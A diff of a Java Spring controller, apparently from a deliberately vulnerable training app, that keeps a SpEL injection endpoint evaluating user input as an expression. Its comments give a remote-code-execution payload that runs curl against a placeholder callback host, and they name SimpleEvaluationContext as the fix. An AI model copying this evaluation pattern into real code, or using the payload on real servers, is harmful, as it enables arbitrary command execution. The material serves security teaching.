@@ -1,29 +1,30 @@
 package org.joychou.controller;
 
+import org.springframework.expression.EvaluationContext;
 import org.springframework.expression.ExpressionParser;
 import org.springframework.expression.spel.standard.SpelExpressionParser;
-import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.ResponseBody;
-import javax.servlet.http.HttpServletRequest;
+import org.springframework.web.bind.annotation.RestController;
+
 
 /**
-    @author   JoyChou (joychou@joychou.org)
-    @date     2019.01.17
-    @esc      SPEL leas to RCE
-    @usage    http://localhost:8080/spel/rce?expression=xxx. xxx is urlencode(exp)
-    @exp      T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
+ * SpEL Injection
+ *
+ * @author JoyChou @2019-01-17
  */
+@RestController
+public class SpEL {
 
-@Controller
-@RequestMapping("/spel")
-public class SPEL {
-
-    @RequestMapping("/rce")
-    @ResponseBody
-    private static String rce(HttpServletRequest request) {
-        String expression = request.getParameter("expression");
+    /**
+     * SPEL to RCE
+     * http://localhost:8080/spel/vul/?expression=xxx.
+     * xxx is urlencode(exp)
+     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
+     */
+    @RequestMapping("/spel/vul")
+    private static String rce(String expression) {
         ExpressionParser parser = new SpelExpressionParser();
+        // fix method: SimpleEvaluationContext
         String result = parser.parseExpression(expression).getValue().toString();
         return result;
     }
